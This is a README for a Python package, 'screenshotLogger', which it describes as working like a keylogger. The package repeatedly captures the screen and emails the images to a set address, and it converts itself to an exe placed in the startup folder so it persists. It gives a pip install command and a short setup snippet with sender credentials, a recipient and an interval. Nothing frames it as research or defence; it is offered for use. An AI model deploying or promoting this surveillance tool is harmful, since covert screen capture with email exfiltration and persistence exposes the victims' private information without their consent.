# screenshotLogger 

ScreenshotLogger works just like a keylogger but instead of capturing keystroke,it captures the screen, stores it or sends via email.

# Overview
The screenshotLogger Program was written with fast use in mind. It provides the following key features

  - Continuosly Take Screenshots and Sending To Specified Email Addresses Within a Specified Interval
  - Custom InBuilt Function To Convert Py file To Exe and store in startup Programs Folder.
 


## Usage

In the following paragraphs, I am going to describe how you can get and use screenshotLogger.

###  Getting it

To download screenshotLogger , either fork this github repo or simply use Pypi via pip.
```sh
$ pip install screenshotLogger 
```

### Using it

First, import screenshotLogger from screenshotLogger

```Python
from screenshotLogger import screenshotLogger 
```

 
## Initialize screenshotLogger 
First, let's create a new screenshotLogger object. For this manner, just provide the sender email, sender password, receiver email,interval and store action. 

```Python
 
sl = screenshotLogger(sender_email='example@gmail.com',
                      sender_password='testpassword',
                      send_to='receiver@gmail.com',
                      interval=3,
                      store='file')
slv = sl.validate()
sl.execute(slv)



```

 



License
----

MIT License

Copyright (c) 2021 Teddy Oweh

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


Hire me: `teddyoweh`
